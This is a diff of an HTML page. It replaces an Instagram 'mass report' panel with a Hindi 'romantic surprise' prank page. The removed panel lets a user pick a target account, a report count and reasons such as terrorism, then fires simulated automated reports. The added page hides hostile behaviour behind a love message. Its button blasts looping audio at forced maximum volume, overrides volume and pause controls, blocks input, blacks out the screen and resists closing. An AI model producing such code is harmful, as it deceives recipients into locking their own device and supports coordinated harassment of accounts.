@@ -1,441 +1,366 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 SIVASINGH Report System 🔥</title>
+    <title>Romantic Surprise for My Cutie Pie 💕</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-touch-callout: none;
+            -webkit-tap-highlight-color: transparent;
         }
-
+        
         body {
-            font-family: 'Courier New', monospace;
-            background: linear-gradient(45deg, #000000, #1a1a1a, #000000);
-            background-size: 400% 400%;
-            animation: gradientShift 8s ease infinite;
+            font-family: 'Poppins', sans-serif;
             height: 100vh;
             overflow: hidden;
-            color: #00FF00;
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .container {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .screen {
-            width: 100%;
-            max-width: 450px;
-            background: rgba(0, 0, 0, 0.95);
-            border: 3px solid #00FF00;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.5);
             position: relative;
-            overflow: hidden;
+            animation: heartBeat 2s infinite;
+            touch-action: none;
         }
-
-        .screen::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, #00FF00, #FF0000, #00FF00, #FF0000);
-            border-radius: 20px;
-            z-index: -1;
-            animation: borderGlow 2s linear infinite;
-        }
-
-        @keyframes borderGlow {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .title {
-            text-align: center;
-            font-size: 28px;
-            font-weight: bold;
-            color: #FF0000;
-            margin-bottom: 30px;
-            text-shadow: 0 0 20px #FF0000;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
+        
+        @keyframes heartBeat {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.05); }
         }
-
-        .subtitle {
-            text-align: center;
-            font-size: 16px;
-            color: #00FF00;
-            margin-bottom: 50px;
-            text-shadow: 0 0 10px #00FF00;
-        }
-
-        .input-field {
+        
+        .hearts {
+            position: absolute;
             width: 100%;
-            height: 60px;
-            background: #1A1A1A;
-            border: 2px solid #00FF00;
-            border-radius: 10px;
-            color: #FFFFFF;
-            font-size: 18px;
-            padding: 0 20px;
-            margin-bottom: 30px;
-            text-align: center;
-            font-family: 'Courier New', monospace;
-            transition: all 0.3s ease;
-        }
-
-        .input-field:focus {
-            outline: none;
-            box-shadow: 0 0 20px #00FF00;
-            border-color: #00FF00;
-        }
-
-        .input-field::placeholder {
-            color: #888888;
-        }
-
-        .btn {
-            width: 100%;
-            height: 60px;
-            border: none;
-            border-radius: 15px;
-            font-size: 20px;
-            font-weight: bold;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 15px;
-            text-shadow: 0 0 10px #000;
-        }
-
-        .btn-primary {
-            background: #006600;
-            color: #FFFFFF;
-            border: 3px solid #00FF00;
-        }
-
-        .btn-primary:hover {
-            background: #00FF00;
-            color: #000000;
-            box-shadow: 0 0 30px #00FF00;
-            transform: translateY(-2px);
-        }
-
-        .btn-danger {
-            background: #660000;
-            color: #FFFFFF;
-            border: 3px solid #FF0000;
-            height: 70px;
-            font-size: 22px;
-        }
-
-        .btn-danger:hover {
-            background: #FF0000;
-            color: #000000;
-            box-shadow: 0 0 30px #FF0000;
-            transform: translateY(-2px);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .report-screen {
-            padding: 20px;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .label {
-            color: #00FF00;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-
-        select.input-field {
-            padding: 15px 20px;
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300FF00'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 15px center;
-            background-size: 20px;
-        }
-
-        .progress {
-            width: 100%;
-            height: 10px;
-            background: #1A1A1A;
-            border-radius: 5px;
-            margin: 20px 0;
-            overflow: hidden;
-            border: 1px solid #00FF00;
-        }
-
-        .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #00FF00, #FF0000);
-            width: 0%;
-            transition: width 0.3s ease;
+            overflow: hidden;
+            z-index: 1;
+            pointer-events: none;
         }
-
-        .status {
+        
+        .heart {
+            position: absolute;
+            color: #ff69b4;
+            font-size: 20px;
+            animation: float 6s infinite linear;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        .container {
             text-align: center;
-            font-size: 18px;
-            margin: 20px 0;
-            min-height: 25px;
+            z-index: 10;
+            position: relative;
+            animation: fadeInUp 1.5s ease-out;
         }
-
-        .success { color: #00FF00; }
-        .error { color: #FF0000; }
-        .warning { color: #FFFF00; }
-
-        .logs {
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .photo {
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 8px solid rgba(255, 255, 255, 0.8);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            margin-bottom: 30px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
+            50% { box-shadow: 0 20px 60px rgba(255, 105, 180, 0.4); }
+            100% { box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
+        }
+        
+        h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 3.5em;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            margin-bottom: 20px;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 2px 2px 4px rgba(0,0,0,0.3), 0 0 20px #ff69b4; }
+            to { text-shadow: 2px 2px 4px rgba(0,0,0,0.3), 0 0 30px #ff1493; }
+        }
+        
+        p {
+            font-size: 1.4em;
+            color: #fff;
+            margin-bottom: 40px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+            font-weight: 300;
+        }
+        
+        .magic-btn {
+            background: linear-gradient(45deg, #ff6b9d, #c44569);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 1.5em;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 15px 30px rgba(255, 107, 157, 0.4);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+            touch-action: manipulation;
+        }
+        
+        .magic-btn:hover, .magic-btn:active {
+            transform: translateY(-5px);
+            box-shadow: 0 25px 50px rgba(255, 107, 157, 0.6);
+        }
+        
+        /* Screen off effect */
+        .screen-off {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: #000;
-            border: 1px solid #00FF00;
-            border-radius: 10px;
-            padding: 15px;
-            height: 200px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            margin-top: 20px;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
         }
-
-        .log-entry {
-            margin-bottom: 5px;
-            padding: 2px 0;
+        
+        .screen-off.active {
+            opacity: 1;
+            pointer-events: all;
         }
-
-        @media (max-width: 480px) {
-            .screen {
-                margin: 10px;
-                padding: 20px;
-            }
-            .title {
-                font-size: 24px;
-            }
+        
+        .screen-off.active::before {
+            content: '💕 तेरे लिए 💕';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #ff69b4;
+            font-size: 2em;
+            font-family: 'Dancing Script', cursive;
+            animation: heartbeat 1s infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes heartbeat {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.1); }
+        }
+        
+        /* Hidden audio */
+        audio {
+            display: none !important;
+        }
+        
+        /* Volume locker */
+        .volume-locker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
+    <div class="hearts" id="hearts"></div>
+    
+    <div class="screen-off" id="screenOff"></div>
+    <div class="volume-locker" id="volumeLocker"></div>
+    
     <div class="container">
-        <!-- Key Screen -->
-        <div id="keyScreen" class="screen">
-            <div class="title">🔥 SIVASINGH REPORT SYSTEM 🔥</div>
-            <div class="subtitle">insta-@smss1708</div>
-            <input type="text" id="keyInput" class="input-field" placeholder="Enter Key: @smss1708" maxlength="20">
-            <button class="btn btn-primary" onclick="checkKey()">🔓 UNLOCK PANEL</button>
-        </div>
-
-        <!-- Report Screen -->
-        <div id="reportScreen" class="screen hidden">
-            <div class="title">⚡ SIVASINGH Report Panel ⚡</div>
-            <div class="subtitle">insta-@smss1708</div>
-            
-            <div class="form-group">
-                <div class="label">🎯 Target Instagram ID</div>
-                <input type="text" id="targetId" class="input-field" placeholder="Enter Instagram username">
-            </div>
-
-            <div class="form-group">
-                <div class="label">🔢 Number of Reports</div>
-                <input type="number" id="reportCount" class="input-field" value="100" min="1" max="1000">
-            </div>
-
-            <div class="form-group">
-                <div class="label">⚖️ Report Reason</div>
-                <select id="reasonSpinner" class="input-field">
-                    <option>Hate Speech</option>
-                    <option>Nudity</option>
-                    <option>Violence</option>
-                    <option>Spam</option>
-                    <option>Harassment</option>
-                    <option>Impersonation</option>
-                    <option>Terrorism</option>
-                    <option>Illegal Drugs</option>
-                </select>
-            </div>
-
-            <div class="progress" id="progressBar" style="display: none;">
-                <div class="progress-bar" id="progressFill"></div>
-            </div>
-
-            <div id="status" class="status"></div>
-
-            <button id="reportBtn" class="btn btn-danger" onclick="startMassReport()">
-                🚀 START MASS REPORT
-            </button>
-            <button class="btn btn-primary" onclick="contactDeveloper()">
-                📞 Contact Developer
-            </button>
-
-            <div id="logs" class="logs" style="display: none;"></div>
-        </div>
+        <img src="photo1.jpg" alt="My Cutie Pie" class="photo" id="lovePhoto">
+        <h1>मेरी क्यूटी पाई 💕</h1>
+        <p>मैंने तुम्हारे लिए कुछ खास बनाया है... बस एक बार दबा दो! 😍</p>
+        <button class="magic-btn" id="magicBtn">✨ मैजिक बटन ✨</button>
     </div>
 
+    <!-- Multiple audio tracks for unstoppable volume -->
+    <audio id="romanticSong1" loop preload="auto">
+        <source src="tere-liye.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="romanticSong2" loop preload="auto">
+        <source src="tere-liye.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="romanticSong3" loop preload="auto">
+        <source src="tere-liye.mp3" type="audio/mpeg">
+    </audio>
+
     <script>
-        const VALID_KEY = "@smss1708";
-        let isReporting = false;
-        let reportInterval;
+        let audioActive = false;
+        let audioTracks = [
+            document.getElementById('romanticSong1'),
+            document.getElementById('romanticSong2'),
+            document.getElementById('romanticSong3')
+        ];
+        let currentTrack = 0;
 
-        function checkKey() {
-            const keyInput = document.getElementById('keyInput').value.trim();
-            if (keyInput === VALID_KEY) {
-                document.getElementById('keyScreen').classList.add('hidden');
-                document.getElementById('reportScreen').classList.remove('hidden');
-            } else {
-                showStatus('❌ Invalid Key! Key: @smss1708', 'error');
-                document.getElementById('keyInput').value = '';
-                document.getElementById('keyInput').focus();
-            }
-        }
-
-        function startMassReport() {
-            const target = document.getElementById('targetId').value.trim();
-            const countStr = document.getElementById('reportCount').value.trim();
-            const reason = document.getElementById('reasonSpinner').value;
-
-            if (!target || !countStr) {
-                showStatus('⚠️ Target ID & Count Required!', 'warning');
-                return;
-            }
-
-            const count = parseInt(countStr);
-            if (count > 1000 || count < 1) {
-                showStatus('⚠️ Count must be between 1-1000!', 'warning');
-                return;
-            }
-
-            massReport(target, reason, count);
-        }
-
-        function massReport(target, reason, count) {
-            isReporting = true;
-            const reportBtn = document.getElementById('reportBtn');
-            const progressBar = document.getElementById('progressBar');
-            const progressFill = document.getElementById('progressFill');
-            const logs = document.getElementById('logs');
-            const status = document.getElementById('status');
-
-            reportBtn.disabled = true;
-            reportBtn.textContent = 'Reporting... 0/' + count;
-            progressBar.style.display = 'block';
-            logs.style.display = 'block';
-            logs.innerHTML = '';
-
-            let currentCount = 0;
-
-            reportInterval = setInterval(() => {
-                if (currentCount < count) {
-                    sendReport(target, reason, currentCount + 1);
-                    currentCount++;
-
-                    const progress = (currentCount / count) * 100;
-                    progressFill.style.width = progress + '%';
-                    reportBtn.textContent = 'Reporting... ' + currentCount + '/' + count;
-                    logs.scrollTop = logs.scrollHeight;
-                } else {
-                    clearInterval(reportInterval);
-                    reportBtn.disabled = false;
-                    reportBtn.textContent = '🚀 REPORT SENT!';
-                    progressFill.style.width = '100%';
-                    showStatus('✅ ' + count + ' Reports Sent to @' + target, 'success');
-                    
-                    setTimeout(() => {
-                        progressBar.style.display = 'none';
-                        logs.style.display = 'none';
-                        status.textContent = '';
-                    }, 3000);
+        // Volume lock function
+        function lockVolume() {
+            // Keep forcing max volume every 100ms
+            const volumeInterval = setInterval(() => {
+                if (audioActive) {
+                    audioTracks.forEach(track => {
+                        if (track) {
+                            track.volume = 1.0;
+                        }
+                    });
                 }
-            }, 500); // 500ms delay same as original
-        }
+            }, 100);
 
-        function sendReport(target, reason, attempt) {
-            const reasonCode = getReasonCode(reason);
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.innerHTML = `📤 Report #${attempt}: ${target} - ${reason} (${reasonCode})`;
-            document.getElementById('logs').appendChild(logEntry);
-
-            // Simulate API call
-            fetch('https://httpbin.org/post', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    user_id: target,
-                    reason: reasonCode,
-                    description: `Automated report #${attempt}`,
-                    timestamp: new Date().toISOString()
-                })
-            }).catch(() => {}); // Silent fail for demo
-        }
-
-        function getReasonCode(reason) {
-            const codes = {
-                'Hate Speech': 'hate_speech',
-                'Nudity': 'nudity',
-                'Violence': 'violence',
-                'Spam': 'spam',
-                'Harassment': 'harassment',
-                'Impersonation': 'impersonation',
-                'Terrorism': 'terrorism',
-                'Illegal Drugs': 'drugs'
-            };
-            return codes[reason] || 'spam';
-        }
-
-        function showStatus(message, type) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.className = 'status ' + type;
-        }
-
-        function contactDeveloper() {
-            window.open('https://www.instagram.com/smss1708?igsh=aGcwcjhmdWpjd2w2', '_blank');
-        }
-
-        // Enter key support
-        document.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                if (!document.getElementById('reportScreen').classList.contains('hidden')) {
-                    startMassReport();
-                } else {
-                    checkKey();
+            // Prevent volume change events
+            document.addEventListener('volumechange', (e) => {
+                if (audioActive) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    audioTracks.forEach(track => track.volume = 1.0);
                 }
+            }, true);
+
+            // Lock media session
+            if ('mediaSession' in navigator) {
+                navigator.mediaSession.setActionHandler('pause', () => {});
+                navigator.mediaSession.setActionHandler('play', () => {});
+            }
+        }
+
+        // Create floating hearts
+        function createHearts() {
+            const heartsContainer = document.getElementById('hearts');
+            for(let i = 0; i < 50; i++) {
+                const heart = document.createElement('div');
+                heart.className = 'heart';
+                heart.innerHTML = ['💖', '💕', '💗', '💓', '💞'][Math.floor(Math.random()*5)];
+                heart.style.left = Math.random() * 100 + '%';
+                heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
+                heart.style.animationDelay = Math.random() * 2 + 's';
+                heartsContainer.appendChild(heart);
+            }
+        }
+        
+        // Main surprise function
+        window.surprise = function() {
+            if (audioActive) return;
+            
+            audioActive = true;
+            lockVolume();
+            
+            // Start all audio tracks
+            audioTracks.forEach((track, index) => {
+                track.volume = 1.0;
+                track.play().then(() => {
+                    console.log(`Track ${index + 1} playing`);
+                }).catch(e => {
+                    console.log('Track failed:', e);
+                });
+            });
+            
+            // Hide button
+            document.getElementById('magicBtn').style.display = 'none';
+            
+            // Screen off effect
+            const screenOff = document.getElementById('screenOff');
+            screenOff.classList.add('active');
+            
+            // Fullscreen photo flash
+            const photo = document.getElementById('lovePhoto');
+            photo.style.position = 'fixed';
+            photo.style.top = '50%';
+            photo.style.left = '50%';
+            photo.style.transform = 'translate(-50%, -50%) scale(2)';
+            photo.style.zIndex = '9999';
+            photo.style.borderRadius = '20px';
+            photo.style.width = '350px';
+            photo.style.height = '350px';
+            photo.style.boxShadow = '0 0 100px #ff69b4';
+            
+            setTimeout(() => {
+                photo.style.opacity = '0';
+            }, 3000);
+            
+            // Block all interactions
+            document.body.style.pointerEvents = 'none';
+            document.addEventListener('keydown', preventAll, true);
+            document.addEventListener('contextmenu', preventAll, true);
+            document.addEventListener('selectstart', preventAll, true);
+            
+            // Continuous heart generation
+            setInterval(createHearts, 3000);
+            
+            // Vibration pattern
+            if (navigator.vibrate) {
+                navigator.vibrate([200, 100, 400, 100, 200, 100, 400]);
+            }
+        }
+        
+        function preventAll(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        
+        // Initialize
+        createHearts();
+        
+        // Touch to unlock audio (iOS Safari fix)
+        document.addEventListener('touchstart', function() {
+            audioTracks.forEach(track => {
+                track.volume = 1.0;
+                track.load();
+            });
+        }, { once: true });
+        
+        // Prevent page unload
+        window.addEventListener('beforeunload', (e) => {
+            if (audioActive) {
+                e.preventDefault();
+                e.returnValue = '';
             }
         });
-
-        // Auto-focus
-        document.getElementById('keyInput').focus();
+        
+        // Block volume keys
+        document.addEventListener('keydown', (e) => {
+            if (audioActive && (e.key === 'ArrowUp' || e.key === 'ArrowDown' || e.key === 'MediaTrackNext' || e.key === 'MediaTrackPrevious')) {
+                e.preventDefault();
+                audioTracks.forEach(track => track.volume = 1.0);
+            }
+        }, true);
     </script>
 </body>
 </html>
